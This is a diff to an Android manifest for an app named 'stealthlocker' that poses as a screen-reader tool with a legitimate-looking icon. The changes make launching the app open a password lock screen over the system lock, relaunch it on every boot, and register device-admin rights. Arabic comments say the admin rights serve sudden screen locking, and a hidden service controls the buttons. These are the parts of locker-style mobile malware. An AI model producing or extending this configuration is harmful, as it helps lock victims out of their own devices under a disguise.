@@ -2,21 +2,59 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.stealthlocker">
 
+    <!-- أذونات الإقلاع، التراكب، الاستيقاظ، وإلغاء قفل النظام الأساسية -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+
     <application
         android:icon="@drawable/legitimate_app_icon"
         android:label="أداة قراءة الشاشة"
         android:theme="@style/Theme.AppCompat.NoActionBar">
 
-        <!-- الواجهة الأولى التي تفتح عند النقر على التطبيق -->
-        <activity android:name=".MainActivity" android:exported="true">
+        <!-- الواجهة الأولى التي تفتح عند النقر على التطبيق (تتحول فوراً للقفل وتغفي الهاتف) -->
+        <activity 
+            android:name=".PasswordLockActivity" 
+            android:exported="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:noHistory="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- شاشة القفل السوداء المخفية -->
-        <activity android:name=".PasswordLockActivity" android:exported="false" />
+        <!-- شاشة القفل أو الواجهات الأخرى التابعة للتطبيق -->
+        <activity android:name=".MainActivity" android:exported="false" />
+
+        <!-- مُستقبل إعادة تشغيل الهاتف لفتح التطبيق فور الإقلاع -->
+        <receiver 
+            android:name=".BootReceiver" 
+            android:enabled="true" 
+            android:exported="true" 
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- مُستقبل صلاحيات مسؤول الجهاز (المسؤول عن تنفيذ الإغفاء والقفل المفاجئ للشاشة) -->
+        <receiver
+            android:name=".MyAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
 
         <!-- الخدمة الخفية التي تتحكم بالأزرار -->
         <service
@@ -33,4 +71,3 @@
 
     </application>
 </manifest>
-
